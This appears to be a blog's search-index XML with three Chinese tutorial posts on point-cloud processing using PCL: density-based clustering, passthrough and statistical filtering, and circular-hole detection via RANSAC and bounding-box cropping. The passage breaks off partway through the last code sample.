<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>点云计算点密度特征</title>
    <url>/2023/08/03/%E7%82%B9%E4%BA%91%E8%AE%A1%E7%AE%97%E7%82%B9%E5%AF%86%E5%BA%A6%E7%89%B9%E5%BE%81/</url>
    <content><![CDATA[<h1 id="一、点云密度介绍"><a href="#一、点云密度介绍" class="headerlink" title="一、点云密度介绍"></a>一、点云密度介绍</h1><p>点云密度反应了点云的密集程度和分布，是点云的重要特征信息；其与采集设备的分辨率，被采集物体的表面材料有关。</p>
<p>广义上的点云密度有两种方法表示：</p>
<p><strong>①距离密度</strong>，即给定需要计算点的数量，统计每个邻近点到该点的距离作为密度；</p>
<p><strong>②点密度</strong>，即给定邻域半径，统计该点领域半径内的点数量作为点密度。</p>
<hr>
<h1 id="二、具体实现"><a href="#二、具体实现" class="headerlink" title="二、具体实现"></a>二、具体实现</h1><p><strong>主要步骤如下：</strong></p>
<ol>
<li>指定搜索半径<code>radius</code>和最小点密度阈值<code>minPts</code>。可以先用<code>cloudcompare</code>查看</li>
<li>用<code>radiusSearch</code>统计种子点的在<code>radius</code>局部点的数量，作为点的密度值<code>densiities</code>。</li>
<li>遍历每个点的密度，满足密度阈值的点放入点集中。</li>
</ol>
<h2 id="2-1指定搜索半径和密度阈值"><a href="#2-1指定搜索半径和密度阈值" class="headerlink" title="2.1指定搜索半径和密度阈值"></a>2.1指定搜索半径和密度阈值</h2><p>这一步可以指定搜索半径和阈值，可以把点云文件导入cloudcompare内查看，以便设置更合适的阈值。</p>
<ul>
<li>导入文件–&gt;Tools–&gt;Other–&gt;Compute geometric features</li>
</ul>
<p><img src="/2023/08/03/%E7%82%B9%E4%BA%91%E8%AE%A1%E7%AE%97%E7%82%B9%E5%AF%86%E5%BA%A6%E7%89%B9%E5%BE%81/image-20230827161857964.png" alt="image-20230827161857964"></p>
<ul>
<li>设置半径和勾选要计算的特征即可，这里我们勾选局部邻域内点的数量作为密度。</li>
</ul>
<p><img src="/2023/08/03/%E7%82%B9%E4%BA%91%E8%AE%A1%E7%AE%97%E7%82%B9%E5%AF%86%E5%BA%A6%E7%89%B9%E5%BE%81/image-20230827162216221.png" alt="image-20230827162216221"></p>
<ul>
<li>拖动状态栏即可查看，设置合适的阈值。</li>
</ul>
<p><img src="/2023/08/03/%E7%82%B9%E4%BA%91%E8%AE%A1%E7%AE%97%E7%82%B9%E5%AF%86%E5%BA%A6%E7%89%B9%E5%BE%81/image-20230827162700463.png" alt="image-20230827162700463"></p>
<h2 id="2-2计算点的局部密度"><a href="#2-2计算点的局部密度" class="headerlink" title="2.2计算点的局部密度"></a>2.2计算点的局部密度</h2><p>首先构建<code>kdtree</code>，使用kdtree中的<code>radiusSearch</code>函数搜索种子点指定半径内点的索引<code>nn_indices</code>，然后将<code>nn_indices.size()</code>作为局部密度赋值给<code>densiities</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先初始化搜索领域半径radius和最小点minPts</span></span><br><span class="line"><span class="type">float</span> radius=<span class="number">0.8</span>;</span><br><span class="line"><span class="type">int</span> minPts=<span class="number">90</span>;</span><br><span class="line">pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">treedense</span> <span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">treedense-&gt;<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line"><span class="comment">//初始化向量，储存局部密度</span></span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; nn_indices;<span class="comment">//储存点云中每个点的最邻索引</span></span><br><span class="line">std::vector&lt;<span class="type">float</span>&gt; nn_dists; <span class="comment">//储存每个点的最邻距离</span></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">float</span>&gt; <span class="title">densiities</span><span class="params">(cloud-&gt;size(),<span class="number">0</span>)</span></span>;<span class="comment">//储存每个点的局部密度，初始化为零</span></span><br><span class="line">                            </span><br><span class="line"><span class="comment">//nn_in和nn_dists,在算法中用于计算每个点的局部密度，对于每个点通过tree-&gt;ra函数找到其在领域半径内的所有最邻点的索引和距离</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; cloud-&gt;<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        treedense-&gt;<span class="built_in">radiusSearch</span>(i,radius,nn_indices,nn_dists);<span class="comment">//1.要查找最邻的点的索引，2.指定半径，3.储存最邻点索引的向量</span></span><br><span class="line">        densiities[i]=nn_indices.<span class="built_in">size</span>();<span class="comment">//赋值给densities</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3筛选点并进行聚类"><a href="#2-3筛选点并进行聚类" class="headerlink" title="2.3筛选点并进行聚类"></a>2.3筛选点并进行聚类</h2><p>创建<code>visited</code>用于记录点是否已经访问过，当点已经被访问过，或点的密度小于阈值则跳过该点。然后创建一个队列<code>queue</code>用于记录当前聚类的点，<code>queue</code>为先入先出结构。最后得到点云满足阈值条件的的密度聚类<code>cluster</code>。将其放入<code>clusters</code>中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::vector&lt;<span class="type">bool</span>&gt;<span class="built_in">visited</span>(cloud-&gt;<span class="built_in">size</span>(),<span class="literal">false</span>);<span class="comment">//用于记录每个点是否被访问过，初始化为每个点都没有访问过</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; cloud-&gt;<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span> (visited[i] || densiities[i] &lt; minPts)<span class="comment">//该点已经被访问，或点的密度小于minpts，</span></span><br><span class="line">       &#123;</span><br><span class="line">            <span class="keyword">continue</span>; </span><br><span class="line">       &#125;</span><br><span class="line">            </span><br><span class="line">       <span class="comment">//visited[i]为true且densities[i]&gt;=minPts</span></span><br><span class="line">       pcl::PointCloud&lt;pcl::PointXYZ&gt; cluster;<span class="comment">//用于储存同一族的点，点云对象</span></span><br><span class="line">       std::vector&lt;<span class="type">int</span>&gt;singlegapindices;</span><br><span class="line">       std::queue&lt;<span class="type">int</span>&gt;q;<span class="comment">//queue先进先出的数据结构</span></span><br><span class="line">       <span class="comment">//使用一个队列q保存当前聚类的点，初始时加入起始点i</span></span><br><span class="line">       q.<span class="built_in">push</span>(i);</span><br><span class="line">       visited[i]=<span class="literal">true</span>;<span class="comment">//标记起始点已经被访问</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//基于广度优先搜索算法对每个聚类进行拓展，BFS从起始点开始逐层搜索</span></span><br><span class="line">       <span class="keyword">while</span> (!q.<span class="built_in">empty</span>())</span><br><span class="line">       &#123;</span><br><span class="line">             <span class="comment">//循环内部，每次取出队列中一个idx，并将其加入到当前聚类中</span></span><br><span class="line">             <span class="comment">//然后查找其半径范围内的邻居点，并将未访问过且密度大于等于minpt的点放入队列中</span></span><br><span class="line">             <span class="type">int</span> idx =q.<span class="built_in">front</span>();<span class="comment">//front返回queue中的第一元素的引用</span></span><br><span class="line">             q.<span class="built_in">pop</span>();<span class="comment">//删除q中第一个元素用于退出循环</span></span><br><span class="line">             cluster.<span class="built_in">push_back</span>((*cloud)[idx]);</span><br><span class="line">             singlegapindices.<span class="built_in">push_back</span>(idx);</span><br><span class="line">             std::vector&lt;<span class="type">int</span>&gt; n_indices;</span><br><span class="line">             std::vector&lt;<span class="type">float</span>&gt; n_dists;</span><br><span class="line">             treedense-&gt;<span class="built_in">radiusSearch</span>(idx, radius, n_indices, n_dists);</span><br><span class="line">             <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; n_indices.<span class="built_in">size</span>(); j++) </span><br><span class="line">             &#123;</span><br><span class="line">                   <span class="type">int</span> neighbor_idx = n_indices[j];</span><br><span class="line">                   <span class="keyword">if</span> (!visited[neighbor_idx] &amp;&amp; densiities[neighbor_idx] &gt;= minPts) <span class="comment">//没有被访问过且点的密度大于minpt</span></span><br><span class="line">                   &#123;</span><br><span class="line">                           q.<span class="built_in">push</span>(neighbor_idx);<span class="comment">//加入到队列中</span></span><br><span class="line">                           visited[neighbor_idx] = <span class="literal">true</span>;<span class="comment">//标记已访问</span></span><br><span class="line">                   &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">		 clusters.<span class="built_in">push_back</span>(cluster);</span><br></pre></td></tr></table></figure>



<h2 id="2-4代码"><a href="#2-4代码" class="headerlink" title="2.4代码"></a>2.4代码</h2><p>总的实现代码。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> SegByLocalDensity（<span class="type">const</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr &amp;cloud,</span><br><span class="line">    					std::vector&lt;pcl::PointCloud&lt;pcl::PointXYZ&gt;&gt;&amp; clusters,</span><br><span class="line">						std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt;&amp; gappointindices）</span><br><span class="line">&#123;</span><br><span class="line">    	<span class="comment">//首先初始化搜索领域半径radius和最小点minPts</span></span><br><span class="line">		<span class="type">float</span> radius=<span class="number">0.8</span>;</span><br><span class="line">        <span class="type">int</span> minPts=<span class="number">90</span>;</span><br><span class="line">        pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">treedense</span> <span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">        treedense-&gt;<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">        <span class="comment">//初始化向量，储存局部密度</span></span><br><span class="line">        std::vector&lt;<span class="type">int</span>&gt; nn_indices;<span class="comment">//储存点云中每个点的最邻索引</span></span><br><span class="line">        std::vector&lt;<span class="type">float</span>&gt; nn_dists; <span class="comment">//储存每个点的最邻距离</span></span><br><span class="line">        <span class="function">std::vector&lt;<span class="type">float</span>&gt; <span class="title">densiities</span><span class="params">(cloud-&gt;size(),<span class="number">0</span>)</span></span>;<span class="comment">//储存每个点的局部密度，并初始化为零</span></span><br><span class="line">                            </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; cloud-&gt;<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">                treedense-&gt;<span class="built_in">radiusSearch</span>(i,radius,nn_indices,nn_dists);<span class="comment">//1.要查找最邻的点的索引，2.指定半径，3.储存最邻点索引的向量</span></span><br><span class="line">                densiities[i]=nn_indices.<span class="built_in">size</span>();<span class="comment">//赋值给densities</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//基于广度优先搜索</span></span><br><span class="line">        std::vector&lt;<span class="type">bool</span>&gt;<span class="built_in">visited</span>(cloud-&gt;<span class="built_in">size</span>(),<span class="literal">false</span>);<span class="comment">//用于记录每个点是否被访问过，初始化为每个点都没有访问过</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; cloud-&gt;<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">if</span> (visited[i] || densiities[i]&lt; minPts)<span class="comment">//||或逻辑，只有当该点已经被访问，且点的密度大于minpts，才执行下面的处理</span></span><br><span class="line">           &#123;</span><br><span class="line">                     <span class="keyword">continue</span>; </span><br><span class="line">           &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//visited[i]为true且densities[i]&gt;=minPts</span></span><br><span class="line">            pcl::PointCloud&lt;pcl::PointXYZ&gt; cluster;<span class="comment">//用于储存同一族的点，点云对象</span></span><br><span class="line">            std::vector&lt;<span class="type">int</span>&gt;singlegapindices;</span><br><span class="line">            std::queue&lt;<span class="type">int</span>&gt;q;<span class="comment">//queue先进先出的数据结构</span></span><br><span class="line">            <span class="comment">//使用一个队列q保存当前聚类的点，初始时加入起始点i</span></span><br><span class="line">            q.<span class="built_in">push</span>(i);<span class="comment">//对queue的对象在push的时候会调用拷贝对象的拷贝构造函数，插入queue中的是对象的一份拷贝</span></span><br><span class="line">            visited[i]=<span class="literal">true</span>;<span class="comment">//标记起始点已经被访问</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//基于广度优先搜索算法对每个聚类进行拓展，BFS从起始点开始逐层搜索</span></span><br><span class="line">            <span class="keyword">while</span> (!q.<span class="built_in">empty</span>())<span class="comment">//如果q中没有元素则返回true</span></span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="comment">//循环内部，每次取出队列中一个idx，并将其加入到当前聚类中</span></span><br><span class="line">                    <span class="comment">//然后查找其半径范围内的邻居点，并将未访问过且密度大于等于minpt的点放入队列中</span></span><br><span class="line">                    <span class="type">int</span> idx =q.<span class="built_in">front</span>();<span class="comment">//front返回queue中的第一元素的引用</span></span><br><span class="line">                    q.<span class="built_in">pop</span>();<span class="comment">//删除q中第一个元素-----------------用于退出循环</span></span><br><span class="line">                    cluster.<span class="built_in">push_back</span>((*cloud)[idx]);</span><br><span class="line">                    singlegapindices.<span class="built_in">push_back</span>(idx);</span><br><span class="line">                    std::vector&lt;<span class="type">int</span>&gt; n_indices;</span><br><span class="line">                    std::vector&lt;<span class="type">float</span>&gt; n_dists;</span><br><span class="line">                    treedense-&gt;<span class="built_in">radiusSearch</span>(idx, radius, n_indices, n_dists);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; n_indices.<span class="built_in">size</span>(); j++) </span><br><span class="line">                    &#123;</span><br><span class="line">                            <span class="type">int</span> neighbor_idx = n_indices[j];</span><br><span class="line">                            <span class="keyword">if</span> (!visited[neighbor_idx] &amp;&amp; densiities[neighbor_idx] &gt;= minPts) <span class="comment">//没有被访问过且点的密度大于minpt</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                    q.<span class="built_in">push</span>(neighbor_idx);<span class="comment">//加入到队列中</span></span><br><span class="line">                                    visited[neighbor_idx] = <span class="literal">true</span>;<span class="comment">//标记已访问</span></span><br><span class="line">                            &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            clusters.<span class="built_in">push_back</span>(cluster);</span><br><span class="line">            gappointindices.<span class="built_in">emplace_back</span>(singlegapindices);</span><br><span class="line">          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="2-5原始图像"><a href="#2-5原始图像" class="headerlink" title="2.5原始图像"></a><strong>2.5原始图像</strong></h2><p><img src="/2023/08/03/%E7%82%B9%E4%BA%91%E8%AE%A1%E7%AE%97%E7%82%B9%E5%AF%86%E5%BA%A6%E7%89%B9%E5%BE%81/image-20230803095757902.png" alt="image-20230803095757902"></p>
<h2 id="2-6处理后的图像"><a href="#2-6处理后的图像" class="headerlink" title="2.6处理后的图像"></a>2.6处理后的图像</h2><p><img src="/2023/08/03/%E7%82%B9%E4%BA%91%E8%AE%A1%E7%AE%97%E7%82%B9%E5%AF%86%E5%BA%A6%E7%89%B9%E5%BE%81/image-20230803095812781.png" alt="image-20230803095812781"></p>
]]></content>
      <categories>
        <category>点云处理</category>
      </categories>
      <tags>
        <tag>点云</tag>
        <tag>特征提取</tag>
        <tag>点云处理</tag>
      </tags>
  </entry>
  <entry>
    <title>点云基础滤波算法</title>
    <url>/2023/08/05/%E7%82%B9%E4%BA%91%E5%9F%BA%E7%A1%80%E6%BB%A4%E6%B3%A2%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="一、点云滤波介绍"><a href="#一、点云滤波介绍" class="headerlink" title="一、点云滤波介绍"></a>一、点云滤波介绍</h1><p>当激光或结构光设备采集的时候会因为被采集物体的表面材料，环境带来许多的噪声点（也叫做离群点），也会因为点云数据冗余，需要进行降采样，便于后续处理数据量的减少。</p>
<p>本文借助PCL开源库，实现基础的点云滤波算法。</p>
<h1 id="二、具体实现"><a href="#二、具体实现" class="headerlink" title="二、具体实现"></a>二、具体实现</h1><h2 id="2-1直通滤波"><a href="#2-1直通滤波" class="headerlink" title="2.1直通滤波"></a>2.1直通滤波</h2><p>直通滤波是在给定的通道上（x、y、z等）进行给定区域的滤波，在自动驾驶中一般用来进行地面的滤除。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/filters/passthrough.h&gt;</span><span class="comment">//头文件</span></span></span><br><span class="line"></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;----------直通滤波开始-------------&quot;</span>&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;*cloud&lt;&lt;endl;</span><br><span class="line">pcl::PointXYZ minPt, maxPt;</span><br><span class="line">pcl::<span class="built_in">getMinMax3D</span>(*cloud,minPt,maxPt);<span class="comment">//获得输入点云的最大最小边界</span></span><br><span class="line"><span class="comment">//关键配置代码</span></span><br><span class="line">pcl::PassThrough&lt;pcl::PointXYZ&gt;PassZ;</span><br><span class="line">PassZ.<span class="built_in">setInputCloud</span>(cloud);<span class="comment">//传入点云</span></span><br><span class="line">PassZ.<span class="built_in">setFilterFieldName</span>(<span class="string">&quot;z&quot;</span>);<span class="comment">//设置滤波字段名，x方向</span></span><br><span class="line">PassZ.<span class="built_in">setFilterLimits</span>(minPt.z,<span class="number">0</span>);<span class="comment">//设置在过滤方向上的点云</span></span><br><span class="line">PassZ.<span class="built_in">setNegative</span>(<span class="literal">true</span>);<span class="comment">//设置false为保留范围内的点,true为剔除范围内点</span></span><br><span class="line">PassZ.<span class="built_in">filter</span>(*cloud);<span class="comment">//保存点</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;----------直通滤波完成-------------&quot;</span>&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;*cloud&lt;&lt;endl;</span><br></pre></td></tr></table></figure>



<h2 id="2-2统计滤波"><a href="#2-2统计滤波" class="headerlink" title="2.2统计滤波"></a>2.2统计滤波</h2><p>统计滤波是针对每一个点进行其领域的统计分析，得到该点到其领域点距离的分布特征，过滤掉不满足阈值的离群点，保留内点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/filters/statistical_outlier_removal.h&gt;</span><span class="comment">//头文件</span></span></span><br><span class="line"></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;----------离群点滤波开始-------------&quot;</span>&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;*cloud&lt;&lt;endl;</span><br><span class="line">pcl::StatisticalOutlierRemoval&lt;pcl::PointXYZ&gt;sor;<span class="comment">//创建过滤器</span></span><br><span class="line">sor.<span class="built_in">setInputCloud</span>(cloud);<span class="comment">//传入要滤波的点云</span></span><br><span class="line">sor.<span class="built_in">setMeanK</span>(<span class="number">50</span>);<span class="comment">//每个点考虑最近邻个数为50</span></span><br><span class="line">sor.<span class="built_in">setStddevMulThresh</span>(<span class="number">1.0</span>);<span class="comment">//设置标准差阈值为1</span></span><br><span class="line"><span class="comment">//这意味着所有距离查询点的平均距离的标准偏差均大于1个标准偏差的所有点都将被标记为离群值并删除。</span></span><br><span class="line">sor.<span class="built_in">filter</span>(*cloud);</span><br><span class="line">cout&lt;&lt;*cloud&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;----------离群点滤波完成-------------&quot;</span>&lt;&lt;endl;</span><br></pre></td></tr></table></figure>

<p><strong>处理图像</strong></p>
<p><img src="/2023/08/05/%E7%82%B9%E4%BA%91%E5%9F%BA%E7%A1%80%E6%BB%A4%E6%B3%A2%E7%AE%97%E6%B3%95/image-20230805160619017.png" alt="image-20230805160619017"></p>
]]></content>
      <categories>
        <category>点云处理</category>
      </categories>
      <tags>
        <tag>点云</tag>
        <tag>直通滤波</tag>
        <tag>统计滤波</tag>
        <tag>PCL</tag>
        <tag>降采样</tag>
      </tags>
  </entry>
  <entry>
    <title>点云特征识别-圆孔特征识别</title>
    <url>/2023/08/06/%E7%82%B9%E4%BA%91%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB-%E5%9C%86%E5%AD%94%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>基于点的特征识别算法相对较少，刚好又需要对项目中的圆孔特征进行滤波，故采取<strong>点云密度+RANSAC</strong>对圆孔特征进行识别和滤波。</p>
<ol>
<li>首先，根据采集点云的<strong>密度差异</strong>提取出包含圆孔特征，边界特征的点云集合；</li>
<li>然后，利用<strong>RANSAC</strong>进行圆孔拟合；</li>
<li>最后，获取拟合的圆孔的半径，圆心利用包围盒进行去除。</li>
</ol>
<h1 id="二、实现"><a href="#二、实现" class="headerlink" title="二、实现"></a>二、实现</h1><h2 id="2-1点云密度差异聚类"><a href="#2-1点云密度差异聚类" class="headerlink" title="2.1点云密度差异聚类"></a>2.1点云密度差异聚类</h2><p>计算点云数据的点密度差异，提取出密度差异的特征点云，并进行欧式聚类，具体实现见<a href="https://liangzhouzz.github.io/2023/08/03/%E7%82%B9%E4%BA%91%E8%AE%A1%E7%AE%97%E7%82%B9%E5%AF%86%E5%BA%A6%E7%89%B9%E5%BE%81/">点云计算点密度特征 | Sifanのblog (liangzhouzz.github.io)</a></p>
<p><strong>原始图像</strong></p>
<img src="/2023/08/06/%E7%82%B9%E4%BA%91%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB-%E5%9C%86%E5%AD%94%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/image-20230806152034159.png" alt="image-20230806152034159" style="zoom:80%;">

<hr>
<p><strong>提取后的图像：</strong></p>
<img src="/2023/08/06/%E7%82%B9%E4%BA%91%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB-%E5%9C%86%E5%AD%94%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/image-20230806152143989.png" alt="image-20230806152143989" style="zoom:80%;">



<h2 id="2-2点云聚类"><a href="#2-2点云聚类" class="headerlink" title="2.2点云聚类"></a>2.2点云聚类</h2><p>将经过密度提取后的点云进行聚类，代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">kd_tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>; <span class="comment">//创建kdtree</span></span><br><span class="line">kd_tree-&gt;<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line"></span><br><span class="line">std::vector&lt;pcl::PointIndices&gt;cluster_indices;<span class="comment">//点索引</span></span><br><span class="line">pcl::EuclideanClusterExtraction&lt;pcl::PointXYZ&gt;ec;<span class="comment">//创建欧式聚类</span></span><br><span class="line">ec.<span class="built_in">setClusterTolerance</span>(<span class="number">0.2</span>);<span class="comment">//聚类容忍度</span></span><br><span class="line">ec.<span class="built_in">setMinClusterSize</span>(<span class="number">20</span>);<span class="comment">//最小聚类点数量</span></span><br><span class="line">ec.<span class="built_in">setMaxClusterSize</span>(cloud-&gt;<span class="built_in">size</span>());<span class="comment">//最大聚类点数量</span></span><br><span class="line">ec.<span class="built_in">setSearchMethod</span>(kd_tree);<span class="comment">//搜索方式</span></span><br><span class="line">ec.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">ec.<span class="built_in">extract</span>(cluster_indices);</span><br></pre></td></tr></table></figure>

<h2 id="2-3RANSAC拟合圆"><a href="#2-3RANSAC拟合圆" class="headerlink" title="2.3RANSAC拟合圆"></a>2.3RANSAC拟合圆</h2><p><strong>RANSAC</strong>拟合圆，可选择拟合2D圆<code>pcl::SACMODEL_CIRCLE2D</code>或3D圆<code>pcl::SACMODEL_CIRCLE3D</code>，这里选择用3D，RANSAC需传入法向量，对点云进行法向量估计。RANSAC会存在拟合错误的情况，需要对拟合出圆的半径进行限制，限制在其范围内找到目标圆。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类创建</span></span><br><span class="line">pcl::SACSegmentationFromNormals&lt;pcl::PointXYZ,pcl::Normal&gt;seg;</span><br><span class="line">pcl::<span class="function">ModelCoefficients::Ptr <span class="title">coefficients</span> <span class="params">(<span class="keyword">new</span> pcl::ModelCoefficients)</span></span>;<span class="comment">//创建索引对象</span></span><br><span class="line">pcl::<span class="function">PointIndices::Ptr <span class="title">inliers</span> <span class="params">(<span class="keyword">new</span> pcl::PointIndices)</span></span>;</span><br><span class="line">std::vector&lt;pcl::ModelCoefficients&gt;coeff;</span><br><span class="line"></span><br><span class="line"><span class="comment">//	估计法向量</span></span><br><span class="line">pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">pcl::NormalEstimation&lt;pcl::PointXYZ, pcl::Normal&gt; ne;</span><br><span class="line">ne.<span class="built_in">setInputCloud</span>(cluster);</span><br><span class="line">ne.<span class="built_in">setSearchMethod</span>(tree);</span><br><span class="line">ne.<span class="built_in">setRadiusSearch</span>(<span class="number">0.01</span>);</span><br><span class="line">ne.<span class="built_in">compute</span>(*normals);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ransac</span></span><br><span class="line">seg.<span class="built_in">setOptimizeCoefficients</span>(<span class="literal">true</span>);</span><br><span class="line">seg.<span class="built_in">setModelType</span>(pcl::SACMODEL_CIRCLE3D);<span class="comment">//拟合3D圆</span></span><br><span class="line">seg.<span class="built_in">setMethodType</span>(pcl::SAC_RANSAC);<span class="comment">//RANSAC</span></span><br><span class="line">seg.<span class="built_in">setNormalDistanceWeight</span>(<span class="number">0.9</span>);<span class="comment">//设置法向量权重</span></span><br><span class="line">seg.<span class="built_in">setMaxIterations</span>(<span class="number">10000</span>);<span class="comment">//设置最大迭代次数</span></span><br><span class="line">seg.<span class="built_in">setDistanceThreshold</span>(<span class="number">0.1</span>);<span class="comment">//eps</span></span><br><span class="line">seg.<span class="built_in">setRadiusLimits</span>(<span class="number">1.5</span>,<span class="number">3</span>);<span class="comment">//添加拟合圆的半径限制，防止拟合过大或过小的圆</span></span><br><span class="line">seg.<span class="built_in">setInputNormals</span>(normals);<span class="comment">//输入法向量</span></span><br><span class="line">seg.<span class="built_in">setInputCloud</span>(cluster);<span class="comment">//传入点集</span></span><br><span class="line">seg.<span class="built_in">segment</span>(*inliers,*coefficients);<span class="comment">//分割</span></span><br></pre></td></tr></table></figure>



<h2 id="2-4包围盒分割"><a href="#2-4包围盒分割" class="headerlink" title="2.4包围盒分割"></a>2.4包围盒分割</h2><p>根据提取出圆的索引，可以得到其圆心坐标和半径，然后利用最小包围盒进行分割。</p>
<p>拟合出3D圆的参数如下：</p>
<ul>
<li><code>圆心坐标x</code>：value[0]</li>
<li><code>圆心坐标y</code>：value[1]</li>
<li><code>圆心坐标z</code>：value[2]</li>
<li><code>半径r</code>：value[3]</li>
<li><code>法向量nx</code>：value[4]</li>
<li><code>法向量ny</code>：value[5]</li>
<li><code>法向量nz</code>：value[6]</li>
</ul>
<p>设置包围盒的最小点坐标<code>min_pt</code>，和最大点坐标<code>max_pt</code>，然后创建包围盒对象，得到在包围盒内的点云索引。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; coeff.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//提取拟合圆环的中心点坐标</span></span><br><span class="line">    <span class="function">Eigen::Vector3f <span class="title">center</span><span class="params">(coeff.at(i).values[<span class="number">0</span>],coeff.at(i).values[<span class="number">1</span>],coeff.at(i).values[<span class="number">2</span>])</span></span>;</span><br><span class="line">    <span class="comment">//设置分割的包围盒长宽高，圆环的半径+阈值</span></span><br><span class="line">    <span class="type">float</span> length0 = <span class="built_in">fabs</span>(coeff.<span class="built_in">at</span>(i).values[<span class="number">3</span>])+<span class="number">0.3</span>,width0 = <span class="built_in">fabs</span>(coeff.<span class="built_in">at</span>(i).values[<span class="number">3</span>])+<span class="number">0.3</span>, height0 = <span class="number">5.0</span>;</span><br><span class="line">    <span class="function">Eigen::Vector4f <span class="title">min_pt</span><span class="params">(center.x()-(length0),center.y()-(width0),center.z()-(height0),<span class="number">0</span>)</span></span>;<span class="comment">//半径</span></span><br><span class="line">    <span class="function">Eigen::Vector4f <span class="title">max_pt</span><span class="params">(center.x()+(length0),center.y()+(width0),center.z()+(height0),<span class="number">0</span>)</span></span>;</span><br><span class="line">				</span><br><span class="line">    <span class="comment">//创建包围盒对象</span></span><br><span class="line">    pcl::CropBox&lt;pcl::PointXYZ&gt;crop;</span><br><span class="line">    crop.<span class="built_in">setMin</span>(min_pt);<span class="comment">//输入最小坐标</span></span><br><span class="line">    crop.<span class="built_in">setMax</span>(max_pt);<span class="comment">//最大坐标</span></span><br><span class="line">    crop.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">    crop.<span class="built_in">setKeepOrganized</span>(<span class="literal">false</span>);<span class="comment">//提取被删除点的索引则为true</span></span><br><span class="line">    crop.<span class="built_in">setUserFilterValue</span>(<span class="number">0.1f</span>);<span class="comment">//</span></span><br><span class="line">    <span class="function">pcl::IndicesPtr <span class="title">indexes</span><span class="params">(<span class="keyword">new</span> std::vector&lt;<span class="type">int</span>&gt;)</span></span>;</span><br><span class="line">    crop.<span class="built_in">filter</span>(*indexes);</span><br><span class="line">	<span class="comment">//创建分割对象</span></span><br><span class="line">    